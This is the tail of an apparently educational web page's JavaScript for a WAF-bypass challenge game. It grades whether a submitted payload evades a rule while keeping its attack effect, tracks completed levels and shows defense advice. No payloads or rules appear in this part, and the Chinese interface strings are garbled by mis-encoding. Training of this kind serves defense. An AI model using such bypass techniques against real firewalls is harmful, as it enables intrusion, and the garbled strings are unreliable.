            document.getElementById('challenge-defense').textContent = 'å®ŒæˆæŒ‘æˆ°å¾Œï¼Œé€™è£¡æœƒé¡¯ç¤ºå¦‚ä½•é˜²è­·é€™é¡ç¹éæŠ€è¡“ã€‚';

            // Update completed status on buttons
            document.querySelectorAll('.level-btn').forEach((btn, index) => {
                btn.classList.toggle('completed', completedChallenges.has(index));
            });
            document.getElementById('challenge-completed').textContent = completedChallenges.size;
        }

        function showHint() {
            document.getElementById('challenge-hint').classList.toggle('show');
        }

        function submitChallenge() {
            const input = document.getElementById('challenge-input').value;
            const challenge = challenges[currentChallenge];
            const result = document.getElementById('challenge-result');
            const title = document.getElementById('challenge-result-title');
            const message = document.getElementById('challenge-result-message');
            const detail = document.getElementById('challenge-result-detail');

            if (!input.trim()) {
                result.classList.remove('success');
                result.classList.add('show', 'fail');
                title.textContent = '[ERROR] è«‹è¼¸å…¥ payload';
                message.textContent = 'è¼¸å…¥æ¬„ä½ä¸èƒ½ç‚ºç©º';
                detail.innerHTML = '';
                return;
            }

            // Check if it still triggers the original rule
            const triggersRule = challenge.rule.test(input);
            // Check if it's a valid bypass
            const isValidBypass = challenge.validate(input);

            result.classList.remove('success', 'fail');
            result.classList.add('show');

            if (isValidBypass) {
                result.classList.add('success');
                title.textContent = '[SUCCESS] ç¹éæˆåŠŸï¼';
                message.textContent = `ä½ çš„ payload æˆåŠŸç¹éäº† WAF è¦å‰‡`;
                detail.innerHTML = `
                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-top: 0.5rem;">
                        <span style="color: var(--text-dim);">input:</span> <span style="color: var(--phosphor);">${escapeHtml(input)}</span><br>
                        <span style="color: var(--text-dim);">rule_match:</span> <span style="color: var(--phosphor);">false</span><br>
                        <span style="color: var(--text-dim);">bypass:</span> <span style="color: var(--phosphor);">true</span>
                    </div>
                `;

                // Mark as completed
                completedChallenges.add(currentChallenge);
                document.querySelectorAll('.level-btn')[currentChallenge].classList.add('completed');
                document.getElementById('challenge-completed').textContent = completedChallenges.size;

                // Show defense recommendation
                document.getElementById('challenge-defense').innerHTML = challenge.defense;

                // Auto advance after success
                if (currentChallenge < challenges.length - 1) {
                    detail.innerHTML += `
                        <button class="btn btn-secondary" style="margin-top: 1rem;" onclick="nextChallenge()">
                            ä¸‹ä¸€é—œ â†’
                        </button>
                    `;
                } else if (completedChallenges.size === challenges.length) {
                    detail.innerHTML += `
                        <div style="margin-top: 1rem; padding: 1rem; background: var(--phosphor-glow); border: 1px solid var(--phosphor);">
                            <strong style="color: var(--phosphor);">ğŸ‰ æ­å–œå®Œæˆæ‰€æœ‰æŒ‘æˆ°ï¼</strong><br>
                            <span style="color: var(--text-secondary); font-size: 0.875rem;">ä½ å·²ç¶“æŒæ¡äº†å¸¸è¦‹çš„ WAF ç¹éæŠ€è¡“ã€‚è¨˜ä½ï¼Œé€™äº›çŸ¥è­˜æ˜¯ç‚ºäº†æ›´å¥½åœ°é˜²è­·ç³»çµ±ï¼</span>
                        </div>
                    `;
                }
            } else if (triggersRule) {
                result.classList.add('fail');
                title.textContent = '[BLOCKED] WAF æ””æˆª';
                message.textContent = 'ä½ çš„ payload è§¸ç™¼äº† WAF è¦å‰‡';
                detail.innerHTML = `
                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-top: 0.5rem;">
                        <span style="color: var(--text-dim);">input:</span> <span style="color: var(--danger);">${escapeHtml(input)}</span><br>
                        <span style="color: var(--text-dim);">rule_match:</span> <span style="color: var(--danger);">true</span><br>
                        <span style="color: var(--text-dim);">hint:</span> è©¦è‘—æ”¹è®Š payload çš„å½¢å¼ä¾†ç¹éè¦å‰‡
                    </div>
                `;
            } else {
                result.classList.add('fail');
                title.textContent = '[INVALID] payload ç„¡æ•ˆ';
                message.textContent = 'é›–ç„¶ç¹éäº†è¦å‰‡ï¼Œä½†é€™å€‹ payload å¯èƒ½ç„¡æ³•é”æˆæ”»æ“Šæ•ˆæœ';
                detail.innerHTML = `
                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-top: 0.5rem;">
                        <span style="color: var(--text-dim);">input:</span> <span style="color: var(--amber);">${escapeHtml(input)}</span><br>
                        <span style="color: var(--text-dim);">rule_match:</span> <span style="color: var(--phosphor);">false</span><br>
                        <span style="color: var(--text-dim);">effective:</span> <span style="color: var(--danger);">false</span><br>
                        <span style="color: var(--text-dim);">hint:</span> payload éœ€è¦ä¿æŒåŸæœ¬çš„æ”»æ“ŠåŠŸèƒ½
                    </div>
                `;
            }
        }

        function nextChallenge() {
            if (currentChallenge < challenges.length - 1) {
                currentChallenge++;
                document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.level-btn')[currentChallenge].classList.add('active');
                loadChallenge();
            }
        }

        function testInSimulator() {
            const input = document.getElementById('challenge-input').value;
            if (input) {
                document.getElementById('waf-input').value = input;
                checkWAF();
                document.getElementById('rules').scrollIntoView({ behavior: 'smooth' });
            }
        }

        // Initialize challenge
        loadChallenge();

        // Allow Enter key to submit challenge
        document.getElementById('challenge-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitChallenge();
            }
        });
    </script>
</body>
</html>
